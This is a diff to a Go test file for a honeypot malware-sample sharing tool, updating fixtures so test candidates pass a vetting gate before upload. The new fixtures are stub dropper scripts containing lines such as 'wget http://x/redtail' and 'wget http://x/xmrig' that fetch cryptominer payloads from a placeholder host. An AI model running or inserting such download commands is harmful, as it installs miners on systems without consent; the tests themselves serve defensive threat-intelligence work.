@@ -49,7 +49,10 @@ func (m *memRecorder) RecordBazaarUpload(sha, status, url string, at time.Time) 
 func TestShareUploadsAndRecords(t *testing.T) {
 	dir := t.TempDir()
 	samplePath := filepath.Join(dir, "sample.bin")
-	if err := os.WriteFile(samplePath, []byte("#!/bin/bash\necho hi\n"), 0o600); err != nil {
+	// A RedTail dropper script fetched in-session: passes Vet (fresh, malware
+	// family, fetched origin). The test is about the upload/dedup pipeline, so
+	// the candidate must clear the submission-policy gate.
+	if err := os.WriteFile(samplePath, []byte("#!/bin/bash\n# redtail miner installer\ncd /tmp && wget http://x/redtail\n"), 0o600); err != nil {
 		t.Fatal(err)
 	}
 
@@ -62,10 +65,12 @@ func TestShareUploadsAndRecords(t *testing.T) {
 
 	rec := newMemRecorder()
 	c := []Candidate{{
-		SHA256:    "aa11bb22cc33",
-		LocalPath: samplePath,
-		SizeBytes: 20,
-		CreatedAt: time.Now(),
+		SHA256:     "aa11bb22cc33",
+		LocalPath:  samplePath,
+		SizeBytes:  70,
+		CreatedAt:  time.Now(),
+		Origin:     "cowrie_download",
+		ObservedAt: time.Now(),
 	}}
 	opts := Options{
 		APIKey:    "k",
@@ -170,7 +175,8 @@ func TestShareSkipsOversize(t *testing.T) {
 func TestShareFatalRejectionStops(t *testing.T) {
 	dir := t.TempDir()
 	p := filepath.Join(dir, "x")
-	_ = os.WriteFile(p, []byte("#!/bin/sh\n"), 0o600)
+	// Must clear Vet so it reaches the network (that's what this test checks).
+	_ = os.WriteFile(p, []byte("#!/bin/sh\n# xmrig miner dropper\nwget http://x/xmrig\n"), 0o600)
 
 	calls := 0
 	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
@@ -180,10 +186,11 @@ func TestShareFatalRejectionStops(t *testing.T) {
 	defer srv.Close()
 
 	rec := newMemRecorder()
+	fresh := time.Now()
 	cands := []Candidate{
-		{SHA256: "a", LocalPath: p, SizeBytes: 10, CreatedAt: time.Now()},
-		{SHA256: "b", LocalPath: p, SizeBytes: 10, CreatedAt: time.Now()},
-		{SHA256: "c", LocalPath: p, SizeBytes: 10, CreatedAt: time.Now()},
+		{SHA256: "a", LocalPath: p, SizeBytes: 70, CreatedAt: fresh, Origin: "cowrie_download", ObservedAt: fresh},
+		{SHA256: "b", LocalPath: p, SizeBytes: 70, CreatedAt: fresh, Origin: "cowrie_download", ObservedAt: fresh},
+		{SHA256: "c", LocalPath: p, SizeBytes: 70, CreatedAt: fresh, Origin: "cowrie_download", ObservedAt: fresh},
 	}
 	_, _, err := Share(context.Background(), rec, cands, Options{
 		APIKey:    "k",
